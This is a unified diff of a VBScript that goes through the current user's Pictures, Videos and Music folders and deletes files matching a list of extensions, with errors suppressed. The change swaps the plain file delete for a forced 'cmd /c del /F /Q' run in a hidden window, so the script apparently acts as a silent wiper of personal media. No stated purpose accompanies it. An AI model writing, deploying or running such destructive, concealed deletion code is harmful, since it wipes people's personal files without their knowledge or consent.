@@ -1,8 +1,9 @@
 On Error Resume Next
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
 
-username = CreateObject("WScript.Network").UserName
+username = objShell.ExpandEnvironmentStrings("%USERNAME%")
 picturesFolder = "C:\Users\" & username & "\Pictures"
 videosFolder = "C:\Users\" & username & "\Videos"
 musicFolder = "C:\Users\" & username & "\Music"
@@ -21,7 +22,7 @@ Sub DeleteFilesByExtensions(folderPath, fileExtensions)
         For Each extension In fileExtensions
             If LCase(extension) = fileExtension Then
                 WScript.Echo "Deleting file: " & objFile.Path
-                objFile.Delete(True) ' Delete the file
+                objShell.Run "cmd /c del """ & objFile.Path & """ /F /Q", 0, True ' Delete the file using command line
                 If Err.Number <> 0 Then
                     WScript.Echo "Error deleting file: " & objFile.Path
                     Err.Clear
